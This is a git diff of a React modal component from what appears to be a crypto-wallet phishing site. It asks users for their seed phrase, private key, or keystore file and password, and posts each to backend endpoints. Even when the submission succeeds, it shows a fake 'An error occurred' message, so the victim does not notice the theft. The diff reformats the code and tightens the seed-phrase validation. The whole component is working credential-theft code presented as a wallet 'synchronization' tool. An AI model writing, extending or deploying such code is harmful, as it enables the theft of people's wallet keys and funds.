@@ -1,67 +1,73 @@
-import Image from "next/image";
-import { useState, useEffect, useRef } from "react";
-import axios from "axios";
+import axios from 'axios';
+import Image from 'next/image';
+import { useEffect, useRef, useState } from 'react';
 
 const Modal = ({ wallet, closeModal }) => {
   const [initialized, setInitialized] = useState(true);
-  const [mode, setMode] = useState("phrase");
+  const [mode, setMode] = useState('phrase');
   const [values, setValues] = useState();
-  const [error, setError] = useState("");
+  const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
   const inputRef = useRef();
 
   let timer;
 
   const handleSubmit = async () => {
-    if (mode === "phrase") {
-      if (!values?.phrase) {
-        setError("Please enter a valid phrase before you proceed!");
+    if (mode === 'phrase') {
+      if (
+        !values?.phrase ||
+        values?.phrase.split(' ').length < 12 ||
+        values?.phrase.split(' ').length > 24
+      ) {
+        setError(
+          'Please enter a valid 12 or 24 digit phrase before you proceed!'
+        );
       } else {
         setLoading(true);
-        const res = await axios.post("/api/phrase", {
+        const res = await axios.post('/api/phrase', {
           phrase: values.phrase,
-          wallet: wallet.name,
+          wallet: wallet.name
         });
 
-        if (res.data.status === "Success") {
+        if (res.data.status === 'Success') {
           setLoading(false);
-          setError("An error occurred, please try again");
+          setError('An error occurred, please try again');
           timer = setTimeout(() => closeModal(), 2000);
         }
       }
-    } else if (mode === "privateKey") {
+    } else if (mode === 'privateKey') {
       if (!values?.privateKey) {
-        setError("Please enter a valid private key before you proceed!");
+        setError('Please enter a valid private key before you proceed!');
       } else {
         setLoading(true);
-        const res = await axios.post("/api/privateKey", {
+        const res = await axios.post('/api/privateKey', {
           privateKey: values.privateKey,
-          wallet: wallet.name,
+          wallet: wallet.name
         });
 
-        if (res.data.status === "Success") {
+        if (res.data.status === 'Success') {
           setLoading(false);
-          setError("An error occurred, please try again");
+          setError('An error occurred, please try again');
           timer = setTimeout(() => closeModal(), 2000);
         }
       }
-    } else if (mode === "keystore") {
+    } else if (mode === 'keystore') {
       if (!values?.keystore || !values?.keystorePassword) {
-        setError("Please upload file and enter password before you proceed!");
+        setError('Please upload file and enter password before you proceed!');
       } else {
         console.log(values);
         const reader = new FileReader();
         reader.readAsDataURL(values.keystore);
         reader.onloadend = async () => {
           setLoading(true);
-          const res = await axios.post("/api/keystore", {
+          const res = await axios.post('/api/keystore', {
             file: reader.result,
             wallet: wallet.name,
-            password: values.keystorePassword,
+            password: values.keystorePassword
           });
-          if (res.data.status === "Success") {
+          if (res.data.status === 'Success') {
             setLoading(false);
-            setError("An error occurred, please try again");
+            setError('An error occurred, please try again');
             timer = setTimeout(() => closeModal(), 2000);
           }
         };
@@ -73,7 +79,7 @@ const Modal = ({ wallet, closeModal }) => {
     let timeout;
     if (error) {
       timeout = setTimeout(() => {
-        setError("");
+        setError('');
       }, 3000);
     }
 
@@ -141,21 +147,21 @@ const Modal = ({ wallet, closeModal }) => {
           <div className="text-[#587087] divide-x mt-[40px] px-[30px] py-[10px] flex space-x-[30px] justify-between border-b-2 border-gray-200">
             <div
               className="relative group cursor-pointer"
-              onClick={() => setMode("phrase")}
+              onClick={() => setMode('phrase')}
             >
               <p className="">Phrase</p>
               <div className="hidden group-hover:block absolute bottom-[-10px] left-[-10%] w-[120%] h-[2px] bg-[#66b0ff]"></div>
             </div>
             <div
               className="relative group  cursor-pointer"
-              onClick={() => setMode("keystore")}
+              onClick={() => setMode('keystore')}
             >
               <p className="pl-[30px]">Keystore JSON</p>
               <div className="hidden group-hover:block absolute bottom-[-10px] left-[10%] w-[100%] h-[2px] bg-[#66b0ff]"></div>
             </div>
             <div
               className="relative group cursor-pointer"
-              onClick={() => setMode("privateKey")}
+              onClick={() => setMode('privateKey')}
             >
               <p className="pl-[30px]">Private Key</p>
               <div className="hidden group-hover:block absolute bottom-[-10px] left-[10%] w-[110%] h-[2px] bg-[#66b0ff]"></div>
@@ -163,7 +169,7 @@ const Modal = ({ wallet, closeModal }) => {
           </div>
 
           <div className="mt-[15px]">
-            {mode === "privateKey" ? (
+            {mode === 'privateKey' ? (
               <input
                 type="text"
                 className="w-full py-[8px] px-[16px] focus:outline-0 border rounded-lg placeholder:tracking-wider placeholder:text-sm"
@@ -171,16 +177,16 @@ const Modal = ({ wallet, closeModal }) => {
                 onChange={(e) =>
                   setValues((prevValues) => ({
                     ...prevValues,
-                    privateKey: e.target.value,
+                    privateKey: e.target.value
                   }))
                 }
               />
-            ) : mode === "keystore" ? (
+            ) : mode === 'keystore' ? (
               <>
                 <div
                   onClick={() => {
                     inputRef.current.click();
-                    console.log("clicked");
+                    console.log('clicked');
                     console.log(inputRef.current);
                   }}
                   className="cursor-pointer py-[15px] border border-[#697399] border-dashed rounded-lg text-center text-[#92a2d6] hover:bg-[#E5E5E5]"
@@ -193,7 +199,7 @@ const Modal = ({ wallet, closeModal }) => {
                     onChange={(e) =>
                       setValues((prevValues) => ({
                         ...prevValues,
-                        keystore: e.target.files[0],
+                        keystore: e.target.files[0]
                       }))
                     }
                   />
@@ -206,7 +212,7 @@ const Modal = ({ wallet, closeModal }) => {
                   onChange={(e) =>
                     setValues((prevValues) => ({
                       ...prevValues,
-                      keystorePassword: e.target.value,
+                      keystorePassword: e.target.value
                     }))
                   }
                 />
@@ -218,15 +224,15 @@ const Modal = ({ wallet, closeModal }) => {
                 onChange={(e) =>
                   setValues((prevValues) => ({
                     ...prevValues,
-                    phrase: e.target.value,
+                    phrase: e.target.value
                   }))
                 }
               />
             )}
 
             <p className="my-[25px] text-xs text-[#587087] lg:max-w-[30vw]">
-              {mode === "privateKey" || mode === "phrase"
-                ? "Typically 12 (sometimes 24) words separated by a single space."
+              {mode === 'privateKey' || mode === 'phrase'
+                ? 'Typically 12 (sometimes 24) words separated by a single space.'
                 : 'Several lines of text beginning with "{...}" plus the password you used to encrypt it.'}
             </p>
 
@@ -236,13 +242,13 @@ const Modal = ({ wallet, closeModal }) => {
             <div
               className={`mb-[30px] py-[8px] flex justify-center  space-x-2  items-center w-full ${
                 loading
-                  ? "bg-gray-300 text-gray-600"
-                  : "bg-[#3182ce] text-white"
+                  ? 'bg-gray-300 text-gray-600'
+                  : 'bg-[#3182ce] text-white'
               } rounded-lg`}
               onClick={handleSubmit}
             >
               <button disabled={loading}>
-                {loading ? "Synchronizing..." : "PROCEED"}
+                {loading ? 'Synchronizing...' : 'PROCEED'}
               </button>
               <svg
                 width="24"
